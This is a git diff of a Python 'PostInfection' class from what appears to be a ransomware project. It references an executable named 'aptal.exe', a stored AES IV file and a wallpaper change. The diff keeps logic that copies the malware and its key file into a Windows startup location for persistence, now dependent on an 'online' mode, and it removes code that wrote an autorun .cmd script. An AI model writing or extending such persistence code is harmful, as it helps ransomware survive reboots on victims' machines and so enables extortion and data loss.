@@ -6,8 +6,9 @@ from shutil import copyfile
 from utils import resourcePath, aesIV_file_store_path
 class PostInfection(object):
 
-    def __init__(self):
+    def __init__(self, mode):
         print("PostInfection Object Created")
+        self.mode = mode
         self.wallpaper_path = resourcePath("wallpaper.png",["images"])   
         print("Wallpaper :", self.wallpaper_path)
 
@@ -39,21 +40,15 @@ class PostInfection(object):
         if os.path.basename(sys.argv[0]) == sys.argv[0]:
             aptal_path = os.path.join(os.getcwd(),sys.argv[0])
 
-        # copy aptal.exe
-        _startup_aptal_path = os.path.join(_startup_location,os.path.basename(sys.argv[0]))
-        copyfile(aptal_path, _startup_aptal_path)
+        if self.mode == "online":
+            # copy aptal.exe because it is coming with gui
+            _startup_aptal_path = os.path.join(_startup_location,os.path.basename(sys.argv[0]))
+            copyfile(aptal_path, _startup_aptal_path)
 
         # copy file which consists of aes IVs 
         _startup_key_file_path = os.path.join(_startup_location,os.path.basename(aesIV_file_store_path))
         copyfile(aesIV_file_store_path, _startup_key_file_path)
 
-        # prevent from overwriting
-        _file_count = str(len(os.listdir(_startup_location)))
-        _autorun_file_path = os.path.join(_startup_location,_file_count+"authrun.cmd")
-
-        # creating autorun script
-        with open(_autorun_file_path,"w") as autorunfile:
-            autorunfile.write(_startup_aptal_path+" "+_startup_key_file_path)
 
     def getSystemInfo(self):
         import platform,socket,json,re,uuid,psutil
